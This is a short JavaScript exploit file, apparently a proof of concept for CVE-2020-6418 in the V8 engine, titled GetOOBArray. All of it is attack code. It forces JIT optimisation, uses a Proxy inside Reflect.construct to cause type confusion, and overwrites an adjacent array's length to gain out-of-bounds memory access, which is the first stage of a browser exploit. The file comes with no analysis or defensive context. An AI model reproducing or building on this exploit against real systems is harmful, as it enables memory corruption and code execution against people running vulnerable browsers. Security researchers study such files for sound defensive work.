/*************************************************************
 * File Name: GetOOBArray.js
 * 
 * Created on: 2020-02-28 05:40:25
 * Author: raycp
 * 
 * Last Modified: 2020-02-28 05:40:57
 * Description: GetOOBArray for cve-2020-6418
************************************************************/
const MAX_ITERATIONS = 0x10000;
var maxSize = 1020*4;
var vulnArray = [,,,,,,,,,,,,,, 1.1, 2.2, 3.3];
vulnArray.pop();
vulnArray.pop();
vulnArray.pop();
var oobArray;
function empty() {}
function evil(optional) {
    vulnArray.push(typeof(Reflect.construct(empty, arguments, optional)) === Proxy? 1.1: 8.063e-320);  // print (i2f(maxSize<<1)) ==> 8.063e-320
    for (let i=0; i<MAX_ITERATIONS; i++) {} // trigger optimization
}

let p = new Proxy(Object, {
    get: () => {
        vulnArray[0] = {};
        oobArray = [1.1, 2.2];
        return Object.prototype;
    }
});

function VulnEntry(func) {
    for (let i=0; i<MAX_ITERATIONS; i++) {}; // trigger optimization
    return evil(func);
}

function GetOOBArray()
{
    for(let i=0; i<MAX_ITERATIONS; i++) {
        empty();
    }
    VulnEntry(empty);
    VulnEntry(empty);
    VulnEntry(p);
}
GetOOBArray();
print("oob array length: "+oobArray.length)
